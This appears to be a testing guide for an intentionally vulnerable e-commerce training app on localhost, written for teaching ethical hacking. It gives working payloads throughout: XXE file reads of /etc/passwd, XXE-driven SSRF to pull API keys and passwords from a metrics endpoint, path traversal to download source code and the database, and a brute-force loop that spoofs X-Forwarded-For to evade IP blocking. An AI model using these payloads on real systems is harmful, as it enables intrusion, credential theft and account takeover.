# 🚀 Quick Testing Guide - Version 1.4

## New Features Testing

### 1️⃣ Auth Token Validation (NOW ENFORCED!)

**Test Invalid Token:**
```bash
# Login
curl -X POST http://localhost:3001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}' \
  -c cookies.txt

# Works
curl http://localhost:3001/api/cart/1 -b cookies.txt

# Change token in cookies.txt to any random value
# Then try again - should get 401
curl http://localhost:3001/api/cart/1 -b cookies.txt
```

**In Browser:**
1. Login to any account
2. Open DevTools → Application → Cookies
3. Change `authToken` value to anything else
4. Try to access cart/profile → Should redirect to login

---

### 2️⃣ IP Blacklisting (5 Minutes!)

**Test Blacklist:**
```bash
# Try 6 failed logins
for i in {1..6}; do
  echo "Attempt $i"
  curl -X POST http://localhost:3001/api/auth/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"wrongpass"}'
  echo ""
done

# 6th attempt should return:
# {
#   "error": "Too many failed login attempts. IP address blocked for 5 minutes.",
#   "blockedUntil": "2025-02-19T..."
# }
```

**Bypass Test:**
```bash
# Use X-Forwarded-For to bypass
for i in {1..10}; do
  curl -X POST http://localhost:3001/api/auth/login \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: 192.168.1.$i" \
    -d '{"username":"admin","password":"wrong"}'
done

# All attempts should go through (bypass works!)
```

---

### 3️⃣ XXE with SSRF

**File Read (XXE):**
```bash
# Linux/Mac - Read /etc/passwd
curl -X POST http://localhost:3001/api/products/check-stock \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<stockCheck><productId>&xxe;</productId></stockCheck>'

# Windows - Read win.ini
curl -X POST http://localhost:3001/api/products/check-stock \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>
<stockCheck><productId>&xxe;</productId></stockCheck>'
```

**SSRF to Internal Service:**
```bash
# Access /metrics endpoint via SSRF (bypasses custom header requirement!)
curl -X POST http://localhost:3001/api/products/check-stock \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://localhost:3001/metrics">]>
<stockCheck><productId>&xxe;</productId></stockCheck>' | jq

# Response includes API keys, database passwords!
```

**SSRF to External Service:**
```bash
# Make server request external URL
curl -X POST http://localhost:3001/api/products/check-stock \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://example.com">]>
<stockCheck><productId>&xxe;</productId></stockCheck>'
```

---

### 4️⃣ Path Traversal via Profile Photo

**In Browser (Easiest):**
1. Login to any account
2. Profile → Upload any image as profile photo
3. View profile page
4. Click "View Profile Photo" link
5. URL will be: `http://localhost:3001/api/view-photo?photo=yourfile.jpg`
6. **Modify URL:**
   - `?photo=../../../server.js` → View server source code
   - `?photo=../../../package.json` → View dependencies
   - `?photo=../../../../database/ecommerce.db` → Download database
   - `?photo=../../../../../etc/passwd` → View system file

**Using curl:**
```bash
# Read server source
curl "http://localhost:3001/api/view-photo?photo=../../../server.js"

# Download database
curl "http://localhost:3001/api/view-photo?photo=../../../../database/ecommerce.db" -o database.db

# Read /etc/passwd
curl "http://localhost:3001/api/view-photo?photo=../../../../../etc/passwd"

# Read package.json
curl "http://localhost:3001/api/view-photo?photo=../../../package.json" | jq
```

---

## 🎯 Attack Scenarios

### Scenario 1: Complete Data Breach via Path Traversal
```bash
# 1. Download entire database
curl "http://localhost:3001/api/view-photo?photo=../../../../database/ecommerce.db" -o db.db

# 2. Extract all users
sqlite3 db.db "SELECT * FROM users"

# 3. Extract passwords
sqlite3 db.db "SELECT username, password FROM users"

# 4. Download source code
curl "http://localhost:3001/api/view-photo?photo=../../../server.js" > server.js

# 5. Analyze for more vulnerabilities
cat server.js | grep -i "password\|secret\|key"
```

### Scenario 2: XXE → SSRF → Steal Secrets
```bash
# Use XXE to access protected /metrics via SSRF
curl -X POST http://localhost:3001/api/products/check-stock \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://localhost:3001/metrics">]>
<stockCheck><productId>&xxe;</productId></stockCheck>' > secrets.json

# secrets.json now contains:
# - Stripe API key
# - AWS credentials  
# - Database password
# - Internal endpoints

# Parse the secrets
cat secrets.json | jq '.xxeData' | jq
```

### Scenario 3: Brute Force Bypass → Account Takeover
```bash
# Create wordlist
echo -e "admin\npassword\n123456\nadmin123\nqwerty" > passwords.txt

# Brute force with IP rotation
i=1
while read password; do
  echo "Trying: $password"
  curl -X POST http://localhost:3001/api/auth/login \
    -H "X-Forwarded-For: 10.0.0.$i" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"admin\",\"password\":\"$password\"}" \
    -c "cookies_$i.txt" -s | grep -q "success" && echo "FOUND: $password" && break
  i=$((i+1))
done < passwords.txt
```

---

## ✅ Quick Verification Checklist

- [ ] Changed auth token → 401 error
- [ ] 6 failed logins → IP blacklisted for 5 minutes
- [ ] X-Forwarded-For header → Bypasses blacklist
- [ ] XXE reads /etc/passwd
- [ ] XXE/SSRF accesses /metrics
- [ ] Path traversal reads server.js
- [ ] Path traversal downloads database
- [ ] Profile photo link visible in UI
- [ ] Hint about URL manipulation shows

---

## 🔧 Troubleshooting

**Auth token still works after changing?**
- Make sure you're testing on a fresh database
- Check backend console for validation errors
- Verify cookies.txt contains both authToken AND userId

**IP not getting blacklisted?**
- Check backend console for blacklist message
- Make sure you're doing 6 attempts rapidly
- Restart server to clear blacklist cache

**XXE not working?**
- Check Content-Type header is `application/xml`
- Make sure XML is properly formatted
- Look for response with `xxeData` field

**Path traversal not working?**
- Must upload profile photo first
- Make sure to use the /api/view-photo endpoint
- Try different number of ../ (3-6 usually works)

---

## 🎓 Learning Objectives

After testing these vulnerabilities, you should understand:

✅ **Why token validation matters**: Even weak validation is better than none
✅ **Why IP blocking needs multiple layers**: X-Forwarded-For can be spoofed
✅ **XXE vs SSRF**: How XXE enables SSRF attacks
✅ **Path traversal impact**: Can lead to full source code disclosure
✅ **Defense in depth**: Multiple vulnerabilities can be chained

---

**Happy Ethical Hacking! 🎯**

Remember: These vulnerabilities exist ONLY for training. Never use these techniques on systems you don't own or have permission to test!
